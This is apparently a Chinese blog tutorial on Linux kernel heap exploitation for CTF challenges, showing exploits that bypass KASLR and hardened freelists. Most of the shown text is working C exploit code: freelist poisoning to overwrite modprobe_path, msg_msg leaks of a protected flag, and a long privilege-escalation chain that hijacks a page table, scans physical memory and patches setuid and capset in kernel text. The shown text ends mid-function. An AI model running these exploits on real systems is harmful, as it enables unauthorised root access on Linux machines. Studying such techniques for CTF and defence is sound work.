---
layout: post
tags: [kernel_pwn]
title: "kernel heap 3: 内核堆利用技巧 2"
author: wsxk
date: 2026-7-25
comments: true
---


- [5.3  kaslr + randomized freelist](#53--kaslr--randomized-freelist)
- [5.4 kaslr + randomized freelist + HARDENED freelist](#54-kaslr--randomized-freelist--hardened-freelist)
- [5.5 kaslr + randomized freelist + HARDENED freelist + 不具备读能力：读取flag](#55-kaslr--randomized-freelist--hardened-freelist--不具备读能力读取flag)
- [5.6 kaslr + randomized freelist + HARDENED freelist + 不具备读能力：提权](#56-kaslr--randomized-freelist--hardened-freelist--不具备读能力提权)
- [5.7 kaslr + randomized freelist + HARDENED freelist + 不具备读能力 + Hardened Usercopy：提权](#57-kaslr--randomized-freelist--hardened-freelist--不具备读能力--hardened-usercopy提权)


PS： 章节承接[https://wsxk.github.io/kernel_heap2/](https://wsxk.github.io/kernel_heap2/)<br>

## 5.3  kaslr + randomized freelist<br>
攻击条件: 可以任意读写某个 kernel slab的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slab的 `uaf` `double free`<br>
泄露地址:<br>
```
1、 通过kernel crash获取kernel基址信息。
因为有uaf，其实相当于我们可以随便改slab freelist的next_ptr地址。
2、uaf修改next_ptr为非法地址
3、申请到该非法地址，触发oops
```
oops脚本:<br>
```c
    //get kernel_base_addr: via Oops
    int fd = open_device();
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd,buf,0);
    // step 2: set next_ptr = 0x4141414141414141
    printf("step2\n");
    memset(buf,0x41,0x1d0);
    write_slot(fd,buf,0x1d0);
    // step 3: alloc the buf
    printf("step3\n");
    int fd2 = open_device(); // fd2.buf = fd.buf
    // step 4: trigger oops
    printf("step4\n");
    int fd3 = open_device();
```
第二步，根据泄露的地址进行漏洞利用，利用方法为修改slab中的`next_ptr`指向`modprobe_path`，并修改`modprobe_path`的内容。<br>
```c
    environ_set();
    //step 0: get kernel_base_addr: via Oops
    unsigned long long kernel_base_addr = 0;
    scanf("%llx",&kernel_base_addr);
    kernel_base_addr = kernel_base_addr - 0x58c20;
    printf("kernel_addr: %llx\n",kernel_base_addr);
    unsigned long long modprobe_addr = kernel_base_addr+0x13f4c0-0x100;
    printf("modprobe_path addr: %llx\n",modprobe_addr);

    //get kernel_base_addr: via Oops
    int fd = open_device();
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd,buf,0);
    // step 2: set next_ptr -> modprobe addr
    printf("step2\n");
    for(int i=0;i<=29;i++){
        memcpy(buf+8*i,(char *)&modprobe_addr,8);
    }
    write_slot(fd,buf,0x8*30);
    // step 3: alloc the buf
    printf("step3\n");
    int fd2 = open_device(); // fd2.buf = fd.buf
    // step 4: write modprobe_path
    printf("step4\n");
    int fd3 = open_device();
    memset(buf,0,0x100);
    memcpy(buf+0x100,"/tmp/exp\x00",10);
    write_slot(fd3,buf,0x100+10);

    get_flag();
```
这里有一个坑点，需要注意`modprobe_path`+0x100的位置为`kmod_concurrent_max`,这个结构体不能随意修改。<br>

## 5.4 kaslr + randomized freelist + HARDENED freelist<br>
攻击条件: 可以任意读写某个 kernel slab的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slab的 `uaf` `double free`<br>
泄露地址:<br>
加了`HARDENED freelist`机制后，之前篡改`next_ptr`会导致kernel panic。暂且不知道理由为何<br>
```
1、 通过kernel crash获取kernel基址信息。（这里需要先获取 s->random ^ swab(ptr_addr) ）的值，可以通过分配完一个slab中的所有slot，再释放slot a，这样a实际下一个堆块为null，所以a->free_list = s->random ^ swab(ptr_addr)
因为有uaf，其实相当于我们可以随便改slab freelist的next_ptr地址。
2、uaf修改next_ptr为非法地址
3、申请到该非法地址，触发oops
```
第二步，根据泄露的地址进行漏洞利用，利用方法为修改slab中的`next_ptr`指向`modprobe_path`，并修改`modprobe_path`的内容。<br>
这里因为思想的进步，想到了一个可以一个脚本完成所有任务的办法:<br>
主要利用的思想是：**内核文件交互可以是并发的，内核文件的kheap服务于所有用户；父子进程共享文件描述符的话，即使其中一个进程销毁了，其相应的文件句柄也不会被释放**<br>
```c
int victim_fd; 
int main(){
    int fd[8];
    for(int i=0;i<8;i++){   //父子进程共享，这样其中一个进程消失也不会被释放
        fd[i] = open_device();
    }
    char buf[1048];
    // step 1: free the chunk -> freelist
    printf("step1\n");
    free_slot(fd[0],buf,0);
    // step 2: leak the swab(&ptr) ^ random
    printf("step2\n");
    memset(buf,0,1048);
    read_slot(fd[0],buf,0x1d0);
    printf("key: %llx\n",*(unsigned long long *)(buf+0xe8));

    // step 3: change next_ptr -> 0x4141414141414141
    printf("step3\n");
    unsigned long long key = *(unsigned long long *)(buf+0xe8);
    key = key ^ 0x4141414141414141;
    *(unsigned long long *)(buf+0xe8) = key;
    write_slot(fd[0],buf,0x1d0); // 此时kmem_cache的free_list中，存在 A-> 0XAAAAAAAA 的链表

    // step 4: alloc slot
    printf("step4\n");
    victim_fd = open_device();  //此时kmem_cache的free_list中，存在0XAAAAAAAA 的链表
    int pid = fork();
    if (pid == 0){
        int fd3 = open_device(); // saved in cache freelist ，此时分配失败，因为0xAAAAAAAA是无效地址，分配失败后， 链表中仍然是 0xAAAAAAAA
    }else{
        int status;
        waitpid(pid, &status, 0); //等待子进程结束，因为父子进程共享文件描述符，所以子进程销毁后他们也不会被释放，当前 kmem_cache的链表仍然为 0xAAAAAAAA
        environ_set();
        //step 0: get kernel_base_addr: via Oops
        unsigned long long kernel_base_addr = 0;
        scanf("%llx",&kernel_base_addr);
        kernel_base_addr = kernel_base_addr - 0x58c20;
        printf("kernel_addr: %llx\n",kernel_base_addr);
        unsigned long long modprobe_addr = kernel_base_addr+0x13f4c0-0x100;
        printf("modprobe_path addr: %llx\n",modprobe_addr);
        //get kernel_base_addr: via Oops
        // step 0 : construct `next_ptr = null situation`

        char buf[1048];
        // step 1: free the chunk -> freelist
        printf("step1\n");
        free_slot(victim_fd,buf,0);
        // step 2: leak the swab(&ptr) ^ random
        printf("step2\n");
        memset(buf,0,1048);
        read_slot(victim_fd,buf,0x1d0);
        printf("key: %llx\n",*(unsigned long long *)(buf+0xe8));
    
        // step 3: change next_ptr -> modprobe
        printf("step3\n");
        unsigned long long key = *(unsigned long long *)(buf+0xe8);
        key = key ^ modprobe_addr ^0x4141414141414141;
        *(unsigned long long *)(buf+0xe8) = key;
        write_slot(victim_fd,buf,0x1d0);
        // step 4: alloc slot
        printf("step4\n");
        int fd2 = open_device();
        int fd3 = open_device();
        memset(buf,0,0x100);
        memcpy(buf+0x100,"/tmp/exp\x00",10);
        write_slot(fd3,buf,0x100+10);
    
        get_flag();
    }

```


## 5.5 kaslr + randomized freelist + HARDENED freelist + 不具备读能力：读取flag<br>
攻击条件: 可以任意写一个 kernel slot（并非ko自己调用`kmem_cache_alloc`申请的`kmem_cache`，而是 **`kmalloc_trace(kmalloc_caches[51], 4197568, 464);`申请**）的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slot的 `uaf` `double free`<br>
这里的目标不是提权，而是获取flag，flag会放入由另一个`kmalloc_trace(kmalloc_caches[51], 4197568, 464);`申请的slot中，不可读。<br>
`kmalloc_trace(kmalloc_caches[51], 4197568, 464);`为在linux自带的kmem_cache中申请的内存。<br>
这里的目标是设法获取kernel中该slot的内容。<br>
这就要提到[kernel heap 利用技巧: msg_msg和pipe_buffer](https://wsxk.github.io/kernel_heap_tech/)里的`msg`结构体了。<br>
```c
int main(){
    char buf[1048];

    pin_to_current_cpu();
    // step 1: open_device
    int fd = open_device(); 

    // step 2: free the slot A
    free_slot(fd,buf,0x1d0); 
    
    // step 3: make the msg use the freed slot
    int msg_id = msg_create_queue();
    struct message ingoing;
    memset(ingoing.text,0x61,MESSAGE_SIZE);
    ingoing.type = 1; // >= 0 is necessary
    msg_send(msg_id,&ingoing,MESSAGE_SIZE,0);  // now msg structure is  msg_msg -> A

    // step 4: free the msg_seg again
    free_slot(fd,buf,0x1d0);  // A is freed

    // step 5: get flag to the msg_seg
    copy_flag(fd,buf,0x1d0); // A is allocated , and contents have been changed

    // step 6: set the A->next_ptr to 0
    memset(buf,0,1048);
    write_slot(fd,buf,8);

    // step 7: recv the msg
    struct message outgoing;
    msg_recv(msg_id,&outgoing,MESSAGE_SIZE,0,0); // now mag_msg and A are freed

    // step 8: resume the env
    copy_flag(fd,buf,0x1d0); // in order to avoid kernel panic(caused by freeing  freed_slot)

    memcpy(buf,outgoing.text+DATAMSG_LEN,DATAMSGSEG_LEN);
    printf("%s\n",buf);
}
```




## 5.6 kaslr + randomized freelist + HARDENED freelist + 不具备读能力：提权<br>
攻击条件: 可以写一个 kernel slot（并非ko自己调用`kmem_cache_alloc`申请的`kmem_cache`，而是 **`kmalloc_trace(kmalloc_caches[51], 4197568, 464);`申请**）的内容。可以多次分配/释放内存<br> 
漏洞：某个kernel slot的 `uaf` `double free`<br>
这里的目标是提权。<br>
`kmalloc_trace(kmalloc_caches[51], 4197568, 464);`为在linux自带的kmem_cache中申请的内存。<br>
因为要提权，第一步还是要想办法获得kernel的地址信息.<br>


```c
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <linux/capability.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

/*
 * Build:
 *   gcc -O2 -Wall -Wextra -fcf-protection=none -masm=intel \
 *       -static exp7.c -o exp7
 *
 * Target:
 *   challenge7.ko + the supplied Linux 6.7.9 vmlinux.
 *
 * Exploit outline:
 *   kheap UAF -> msg_msgseg -> pipe_buffer[] -> pipe page UAF
 *   -> reclaim as a PTE page -> arbitrary physical-page mapping
 *   -> scan physical KASLR with linux_banner -> temporarily patch setuid(2).
 */

#ifndef MSG_COPY
#define MSG_COPY 040000
#endif

#ifndef MAP_FIXED_NOREPLACE
#define MAP_FIXED_NOREPLACE 0x100000
#endif

#define PAGE_SIZE               0x1000UL
#define PMD_SIZE                0x200000UL

#define KHEAP_WRITE             0x5701UL
#define KHEAP_FREE              0x5703UL
#define KHEAP_OBJECT_SIZE       0x1d0UL

#define MSG_HEADER_SIZE         0x30UL
#define MSGSEG_HEADER_SIZE      0x08UL
#define DATALEN_MSG             (PAGE_SIZE - MSG_HEADER_SIZE)          /* 0xfd0 */
#define DATALEN_SEG             (KHEAP_OBJECT_SIZE - MSGSEG_HEADER_SIZE) /* 0x1c8 */
#define MESSAGE_SIZE            (DATALEN_MSG + DATALEN_SEG)            /* 0x1198 */

#define PIPE_RING_SLOTS         8U
#define PIPE_RING_BYTES         (PIPE_RING_SLOTS * 0x28U)              /* 0x140 */
#define PIPE_TARGET_SIZE        (PIPE_RING_SLOTS * PAGE_SIZE)          /* 0x8000 */
#define PIPE_BUF_FLAG_CAN_MERGE 0x10U
#define PIPE_UAF_PAGES          3U
#define PIPE_INITIAL_PAGES      (1U + 2U * PIPE_UAF_PAGES)             /* 7 */

#define PTE_SPRAY_COUNT         128U
#define PTE_SPRAY_BASE          0x10000000UL

#define LINK_TEXT               0xffffffff81000000ULL
#define LINK_ANON_PIPE_OPS      0xffffffff8221f3c0ULL
#define LINK_ZERO_PIPE_OPS      0xffffffff8221a980ULL
#define LINUX_BANNER_OFFSET     0x135ba60ULL
#define SETUID_BRANCH_OFFSET    0x000a0bb1ULL
#define CAP_CAPSET_PATCH_OFFSET 0x004784d0ULL

#define DEFAULT_PHYS_LIMIT      0x40000000ULL
#define PHYS_SCAN_START         0x01000000ULL
#define PTE_ADDR_MASK           0x000ffffffffff000ULL

struct kheap_request {
    void *ubuf;
    uint64_t size;
};

struct message {
    long type;
    unsigned char text[MESSAGE_SIZE];
};

struct pipe_buffer_user {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t padding;
    uint64_t private;
};

struct exploit_context {
    int dev_fd;
    int pipe_fd[2];
    uint64_t pte_page;
    uint64_t zero_pipe_ops;
    unsigned int pipe_head;
    unsigned int first_map_index;
    unsigned int next_map_index;
};

static struct message outgoing;
static struct message leaked;
static struct message cleanup_message;
static unsigned char pipe_input[PIPE_INITIAL_PAGES * PAGE_SIZE];
static unsigned char page_dump[PAGE_SIZE];
static unsigned char warmup_page[PAGE_SIZE];
static void *pte_spray[PTE_SPRAY_COUNT];
static void *pte_spray_sentinel;
static volatile unsigned char spray_sink;

static void fatal(const char *what)
{
    perror(what);
    exit(EXIT_FAILURE);
}

static void fail(const char *what)
{
    fprintf(stderr, "[-] %s\n", what);
    exit(EXIT_FAILURE);
}

static void pin_to_current_cpu(void)
{
    cpu_set_t set;
    int cpu = sched_getcpu();

    if (cpu < 0)
        fatal("sched_getcpu");

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) < 0)
        fatal("sched_setaffinity");

    fprintf(stderr, "[+] pinned to CPU %d\n", cpu);
}

static void write_exact(int fd, const void *buffer, size_t size,
                        const char *name)
{
    const unsigned char *cursor = buffer;
    size_t done = 0;

    while (done < size) {
        ssize_t result = write(fd, cursor + done, size - done);
        if (result < 0) {
            if (errno == EINTR)
                continue;
            fatal(name);
        }
        if (result == 0)
            fail("short write");
        done += (size_t)result;
    }
}

static void read_exact(int fd, void *buffer, size_t size, const char *name)
{
    unsigned char *cursor = buffer;
    size_t done = 0;

    while (done < size) {
        ssize_t result = read(fd, cursor + done, size - done);
        if (result < 0) {
            if (errno == EINTR)
                continue;
            fatal(name);
        }
        if (result == 0)
            fail("short read");
        done += (size_t)result;
    }
}

static void kheap_ioctl(int fd, unsigned long command, void *buffer,
                        uint64_t size, const char *name)
{
    struct kheap_request request = {
        .ubuf = buffer,
        .size = size,
    };

    if (ioctl(fd, command, &request) < 0)
        fatal(name);
}

static void kheap_write(int fd, const void *buffer, uint64_t size)
{
    kheap_ioctl(fd, KHEAP_WRITE, (void *)buffer, size,
                "ioctl(KHEAP_WRITE)");
}

static void kheap_free(int fd)
{
    kheap_ioctl(fd, KHEAP_FREE, NULL, 0, "ioctl(KHEAP_FREE)");
}

static int create_queue(void)
{
    int queue = msgget(IPC_PRIVATE, IPC_CREAT | 0600);
    if (queue < 0)
        fatal("msgget");
    return queue;
}

static void send_message(int queue, struct message *message)
{
    if (msgsnd(queue, message, MESSAGE_SIZE, 0) < 0)
        fatal("msgsnd");
}

static void copy_message(int queue, struct message *message)
{
    ssize_t result;

    result = msgrcv(queue, message, MESSAGE_SIZE, 0,
                    MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
    if (result < 0)
        fatal("msgrcv(MSG_COPY)");
    if ((size_t)result != MESSAGE_SIZE)
        fail("MSG_COPY returned a short message");
}

static int open_device(void)
{
    int fd = open("/proc/kheap", O_RDWR);
    if (fd < 0)
        fatal("open(/proc/kheap)");
    return fd;
}

static void prepare_pte_spray(void)
{
    int executable;
    unsigned int i;

    executable = open("/proc/self/exe", O_RDONLY);
    if (executable < 0)
        fatal("open(/proc/self/exe)");

    /* Every spray mapping uses this same already-cached first file page. */
    if (pread(executable, warmup_page, PAGE_SIZE, 0) != (ssize_t)PAGE_SIZE)
        fail("could not warm the first executable page for PTE spray");

    /*
     * Empirically this target allocates a parent PMD page on the first fault
     * in the spray range.  Force every upper-level allocation to happen now,
     * before any pipe page is freed, by faulting a sentinel in the same PUD.
     */
    pte_spray_sentinel = mmap((void *)(PTE_SPRAY_BASE - PMD_SIZE),
                              PAGE_SIZE, PROT_READ | PROT_WRITE,
                              MAP_PRIVATE | MAP_FIXED_NOREPLACE,
                              executable, 0);
    if (pte_spray_sentinel == MAP_FAILED)
        fatal("mmap(PTE spray sentinel)");
    spray_sink ^= *(volatile unsigned char *)pte_spray_sentinel;

    for (i = 0; i < PTE_SPRAY_COUNT; i++) {
        void *base = (void *)(PTE_SPRAY_BASE + i * PMD_SIZE);
        void *wanted = (unsigned char *)base + (i + 1) * PAGE_SIZE;
        void *mapping;

        mapping = mmap(wanted, PAGE_SIZE, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_FIXED_NOREPLACE,
                       executable, 0);
        if (mapping == MAP_FAILED)
            fatal("mmap(PTE spray)");
        pte_spray[i] = base;

        /*
         * Each one-page VMA lies in a separate PMD and maps file offset zero,
         * but occupies PTE index i+1.  Thus one cached page is sufficient and
         * the leaked present-entry index still identifies the winning VMA.
         */
        if (madvise(mapping, PAGE_SIZE, MADV_NOHUGEPAGE) < 0 &&
            errno != EINVAL)
            fatal("madvise(PTE spray, MADV_NOHUGEPAGE)");
    }

    close(executable);
}

static void expand_victim_mapping(void *victim, unsigned int pte_index)
{
    size_t prefix_size = pte_index * PAGE_SIZE;
    size_t suffix_offset = (pte_index + 1) * PAGE_SIZE;
    size_t suffix_size = PMD_SIZE - suffix_offset;
    void *mapping;

    /* Fill the two gaps without touching the winning one-page file VMA. */
    if (prefix_size != 0) {
        mapping = mmap(victim, prefix_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
                       -1, 0);
        if (mapping == MAP_FAILED)
            fatal("mmap(victim prefix)");
    }

    if (suffix_size != 0) {
        mapping = mmap((unsigned char *)victim + suffix_offset,
                       suffix_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
                       -1, 0);
        if (mapping == MAP_FAILED)
            fatal("mmap(victim suffix)");
    }
}

static void fault_pte_spray(void)
{
    unsigned int i;

    for (i = 0; i < PTE_SPRAY_COUNT; i++) {
        volatile unsigned char *address =
            (volatile unsigned char *)pte_spray[i] + (i + 1) * PAGE_SIZE;
        spray_sink ^= *address;
    }
}

static void release_pte_spray(void)
{
    unsigned int i;

    for (i = 0; i < PTE_SPRAY_COUNT; i++) {
        if (pte_spray[i] != NULL &&
            munmap(pte_spray[i], PMD_SIZE) < 0)
            fatal("munmap(PTE spray)");
        pte_spray[i] = NULL;
    }

    if (pte_spray_sentinel != NULL) {
        if (munmap(pte_spray_sentinel, PAGE_SIZE) < 0)
            fatal("munmap(PTE spray sentinel)");
        pte_spray_sentinel = NULL;
    }
}

static void prepare_pipe(int pipe_fd[2])
{
    int size;

    if (pipe(pipe_fd) < 0)
        fatal("pipe");

    size = fcntl(pipe_fd[1], F_GETPIPE_SZ);
    if (size < 0)
        fatal("fcntl(F_GETPIPE_SZ)");

    /* Force the old ring to differ from the later eight-slot ring. */
    if (size <= (int)PIPE_TARGET_SIZE) {
        size = fcntl(pipe_fd[1], F_SETPIPE_SZ, 16 * PAGE_SIZE);
        if (size < 0)
            fatal("fcntl(F_SETPIPE_SZ, 16 pages)");
    }

    if (size == (int)PIPE_TARGET_SIZE)
        fail("pipe ring was not enlarged before the reclaim stage");
}

static void overwrite_pipe_ring(struct exploit_context *context,
                                struct pipe_buffer_user ring[PIPE_RING_SLOTS])
{
    kheap_write(context->dev_fd, ring, PIPE_RING_BYTES);
}

static void write_pte_qword(struct exploit_context *context,
                            unsigned int pte_index, uint64_t value)
{
    struct pipe_buffer_user ring[PIPE_RING_SLOTS];
    uint64_t observed = 0;
    unsigned int slot;
    unsigned char marker = 'Q';

    if (pte_index >= PAGE_SIZE / sizeof(uint64_t))
        fail("invalid PTE index");

    /* Create one real active buffer, then redirect it to the PTE page. */
    write_exact(context->pipe_fd[1], &marker, 1, "pipe dummy write");
    slot = context->pipe_head & (PIPE_RING_SLOTS - 1);
    context->pipe_head++;

    memset(ring, 0, sizeof(ring));
    ring[slot].page = context->pte_page;
    ring[slot].offset = pte_index * sizeof(uint64_t);
    ring[slot].len = 0;
    ring[slot].ops = context->zero_pipe_ops;
    ring[slot].flags = PIPE_BUF_FLAG_CAN_MERGE;
    overwrite_pipe_ring(context, ring);

    /* The merge path writes at page + offset + len. */
    write_exact(context->pipe_fd[1], &value, sizeof(value),
                "pipe PTE write");
    read_exact(context->pipe_fd[0], &observed, sizeof(observed),
               "pipe PTE drain");
}

static void clear_physical_mappings(struct exploit_context *context)
{
    unsigned int index;

    for (index = context->first_map_index;
         index < context->next_map_index; index++)
        write_pte_qword(context, index, 0);
}

static void recycle_physical_mappings(struct exploit_context *context,
                                      void *victim)
{
    /*
     * Change protection while every forged PTE is still present.  This forces
     * change_protection_range() to visit the used slots and invalidate their
     * TLB entries.  Clearing them first is insufficient: the kernel may only
     * flush slot 0 and leave stale translations for slots 1..511.
     *
     * Once the PROT_NONE shootdown has completed, remove every forged PFN and
     * restore the VMA.  Only the genuine anonymous PTE in slot 0 survives.
     */
    if (mprotect(victim, PMD_SIZE, PROT_NONE) < 0)
        fatal("mprotect(recycle, PROT_NONE)");
    clear_physical_mappings(context);
    if (mprotect(victim, PMD_SIZE, PROT_READ | PROT_WRITE) < 0)
        fatal("mprotect(recycle, PROT_READ|PROT_WRITE)");
    context->next_map_index = context->first_map_index;
    fprintf(stderr, "[*] recycled physical-mapping PTE slots\n");
}

static void *map_physical_page(struct exploit_context *context, void *victim,
                               uint64_t pte_template,
                               uint64_t physical_page)
{
    uint64_t pte;
    unsigned int index;

    if (context->next_map_index >= PAGE_SIZE / sizeof(uint64_t))
        recycle_physical_mappings(context, victim);

    index = context->next_map_index++;

    pte = (pte_template & ~PTE_ADDR_MASK) |
          (physical_page & PTE_ADDR_MASK);
    write_pte_qword(context, index, pte);

    /* This address has never been touched, so there is no stale TLB entry. */
    return (unsigned char *)victim + index * PAGE_SIZE;
}

static uint64_t physical_memory_limit(void)
{
    char line[256];
    uint64_t maximum = 0;
    FILE *file;

    file = fopen("/proc/iomem", "r");
    if (file != NULL) {
        while (fgets(line, sizeof(line), file) != NULL) {
            unsigned long long start, end;
            char description[128];

            if (sscanf(line, "%llx-%llx : %127[^\n]",
                       &start, &end, description) == 3 &&
                strstr(description, "System RAM") != NULL &&
                end + 1 > maximum) {
                maximum = end + 1;
            }
        }
        fclose(file);
    }

    if (maximum > PHYS_SCAN_START)
        return maximum;

    file = fopen("/proc/meminfo", "r");
    if (file != NULL) {
        while (fgets(line, sizeof(line), file) != NULL) {
            unsigned long long kilobytes;

            if (sscanf(line, "MemTotal: %llu kB", &kilobytes) == 1) {
                /* MemTotal excludes reserved RAM, so leave a safety margin. */
                maximum = kilobytes * 1024ULL + 0x08000000ULL;
                break;
            }
        }
        fclose(file);
    }

    if (maximum <= PHYS_SCAN_START)
        maximum = DEFAULT_PHYS_LIMIT;
    return maximum;
}

static uint64_t find_physical_kernel_base(struct exploit_context *context,
                                          void *victim,
                                          uint64_t pte_template)
{
    static const char signature[] = "Linux version 6.7.9";
    uint64_t limit = physical_memory_limit();
    uint64_t candidate;
    unsigned int attempts = 0;

    fprintf(stderr, "[*] scanning physical _text candidates below %#llx\n",
            (unsigned long long)limit);

    for (candidate = PHYS_SCAN_START;
         candidate + LINUX_BANNER_OFFSET + PAGE_SIZE <= limit;
         candidate += PMD_SIZE) {
        uint64_t banner = candidate + LINUX_BANNER_OFFSET;
        size_t offset = banner & (PAGE_SIZE - 1);
        unsigned char *mapping;

        mapping = map_physical_page(context, victim, pte_template,
                                    banner & ~(PAGE_SIZE - 1));
        attempts++;

        if (memcmp(mapping + offset,
                   signature, sizeof(signature) - 1) == 0) {
            fprintf(stderr,
                    "[+] physical _text=%#llx after %u candidates\n",
                    (unsigned long long)candidate, attempts);
            return candidate;
        }

        if ((attempts & 0x3fU) == 0)
            fprintf(stderr, "[*] scanned %u candidates\n", attempts);
    }

    fail("physical kernel base not found");
    return 0;
}

static int print_flag(void)
{
    char buffer[512];
    ssize_t length;
    int fd = open("/flag", O_RDONLY);

    if (fd < 0) {
        fprintf(stderr, "[-] open(/flag): %s\n", strerror(errno));
        return -1;
    }
    length = read(fd, buffer, sizeof(buffer) - 1);
    if (length < 0) {
        fprintf(stderr, "[-] read(/flag): %s\n", strerror(errno));
        close(fd);
        return -1;
    }
    buffer[length] = '\0';
    close(fd);

    printf("[+] flag: %s\n", buffer);
    return 0;
}

static void best_effort_cleanup(struct exploit_context *context,
                                int original_queue,
                                int cleanup_queue_1,
                                int cleanup_queue_2)
{
    struct pipe_buffer_user empty_ring[PIPE_RING_SLOTS];

    /*
     * A is simultaneously referenced by the original msg_msgseg, the pipe
     * ring, and file->private_data.  Reoccupy A between every owner release
     * so SLUB never sees two consecutive frees of the same freelist entry.
     * The two final SysV queues intentionally remain in the IPC namespace.
     */
    memset(empty_ring, 0, sizeof(empty_ring));
    overwrite_pipe_ring(context, empty_ring);

    if (msgctl(original_queue, IPC_RMID, NULL) < 0)
        fatal("msgctl(original, IPC_RMID)");

    send_message(cleanup_queue_1, &cleanup_message);

    if (close(context->dev_fd) < 0)
        fatal("close(/proc/kheap)");
    context->dev_fd = -1;

    send_message(cleanup_queue_2, &cleanup_message);

    if (close(context->pipe_fd[0]) < 0)
        fatal("close(pipe read)");
    if (close(context->pipe_fd[1]) < 0)
        fatal("close(pipe write)");
    context->pipe_fd[0] = context->pipe_fd[1] = -1;
}

int main(void)
{
    struct exploit_context context = {
        .dev_fd = -1,
        .pipe_fd = { -1, -1 },
        .pipe_head = PIPE_INITIAL_PAGES,
    };
    struct pipe_buffer_user forged_ring[PIPE_RING_SLOTS];
    const unsigned char *segment;
    uint64_t target_pages[PIPE_UAF_PAGES];
    uint64_t anon_pipe_ops;
    uint64_t kaslr_slide;
    uint64_t original_pte = 0;
    uint64_t mapping_pte;
    uint64_t physical_text;
    uint64_t setuid_physical;
    uint64_t capset_physical;
    uint64_t zero = 0;
    unsigned char *setuid_mapping;
    unsigned char *capset_mapping;
    static const unsigned char original_branch[] = { 0x74, 0x7a };
    static const unsigned char bypass_branch[] = { 0x90, 0x90 };
    static const unsigned char original_capset[] = {
        0x65, 0x48, 0x8b, 0x14, 0x25
    };
    static const unsigned char bypass_capset[] = {
        0xe9, 0x47, 0x00, 0x00, 0x00
    };
    struct __user_cap_header_struct capability_header;
    struct __user_cap_data_struct capability_data[2];
    unsigned int pte_index = PAGE_SIZE / sizeof(uint64_t);
    unsigned int present_entries = 0;
    unsigned int selected_target = PIPE_UAF_PAGES;
    int privilege_ok = 0;
    int flag_ok = 0;
    void *victim;
    int original_pipe_size;
    int queue;
    int cleanup_queue_1;
    int cleanup_queue_2;
    unsigned int i;
    unsigned int target;

    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    if (sizeof(struct pipe_buffer_user) != 0x28)
        fail("unexpected userspace pipe_buffer layout");

    pin_to_current_cpu();
    prepare_pte_spray();
    victim = NULL;

    prepare_pipe(context.pipe_fd);
    original_pipe_size = fcntl(context.pipe_fd[1], F_GETPIPE_SZ);
    if (original_pipe_size < 0)
        fatal("fcntl(F_GETPIPE_SZ)");

    queue = create_queue();
    cleanup_queue_1 = create_queue();
    cleanup_queue_2 = create_queue();
    context.dev_fd = open_device();

    memset(&outgoing, 'M', sizeof(outgoing));
    outgoing.type = 1;
    memset(&cleanup_message, 0, sizeof(cleanup_message));
    cleanup_message.type = 1;
    memset(pipe_input, 'P', sizeof(pipe_input));

    /* A is freed, then reclaimed as the final 0x1d0-byte msg_msgseg. */
    kheap_free(context.dev_fd);
    send_message(queue, &outgoing);

    /* Free the live segment through file->private_data, then reclaim A. */
    kheap_free(context.dev_fd);
    if (fcntl(context.pipe_fd[1], F_SETPIPE_SZ, PIPE_TARGET_SIZE) !=
        (int)PIPE_TARGET_SIZE)
        fatal("fcntl(F_SETPIPE_SZ, 8 pages)");
    write_exact(context.pipe_fd[1], pipe_input, sizeof(pipe_input),
                 "pipe initial write");

    /*
     * Reading the first anonymous buffer puts its page in pipe->tmp_page.
     * With that cache occupied, releasing the next anonymous buffer takes
     * the put_page() path and really returns our target page to the buddy
     * allocator.  Six live buffers remain in ring slots 1 through 6.
     */
    read_exact(context.pipe_fd[0], page_dump, PAGE_SIZE,
               "prime pipe tmp_page");

    fprintf(stderr,
            "[+] A: driver -> msg_msgseg -> 8-slot pipe ring (%#x -> %#lx)\n",
            original_pipe_size, PIPE_TARGET_SIZE);

    /*
     * msg_msgseg->next aliases pipe_buffer[0].page.  It must be NULL while
     * copy_msg/store_msg walks the one-segment message.
     */
    kheap_write(context.dev_fd, &zero, sizeof(zero));
    memset(&leaked, 0, sizeof(leaked));
    copy_message(queue, &leaked);

    segment = leaked.text + DATALEN_MSG; /* A + sizeof(msg_msgseg) */
    /* Slot 0 was consumed; leak the first still-live buffer in slot 1. */
    memcpy(&anon_pipe_ops, segment + 0x30, sizeof(anon_pipe_ops));
    for (target = 0; target < PIPE_UAF_PAGES; target++)
        memcpy(&target_pages[target], segment + 0x20 + target * 0x28,
               sizeof(target_pages[target]));

    if ((anon_pipe_ops >> 48) != 0xffff ||
        anon_pipe_ops < LINK_ANON_PIPE_OPS) {
        fprintf(stderr, "[-] invalid pipe ops leak: %#llx\n",
                (unsigned long long)anon_pipe_ops);
        best_effort_cleanup(&context, queue,
                            cleanup_queue_1, cleanup_queue_2);
        release_pte_spray();
        return EXIT_FAILURE;
    }

    kaslr_slide = anon_pipe_ops - LINK_ANON_PIPE_OPS;
    for (target = 0; target < PIPE_UAF_PAGES; target++) {
        if ((target_pages[target] >> 48) != 0xffff)
            break;
    }
    if ((kaslr_slide & (PMD_SIZE - 1)) != 0 ||
        target != PIPE_UAF_PAGES) {
        fprintf(stderr,
                "[-] invalid KASLR/page leak: slide=%#llx target=%u "
                "page=%#llx\n",
                (unsigned long long)kaslr_slide,
                target,
                (unsigned long long)(target < PIPE_UAF_PAGES ?
                                     target_pages[target] : 0));
        best_effort_cleanup(&context, queue,
                            cleanup_queue_1, cleanup_queue_2);
        release_pte_spray();
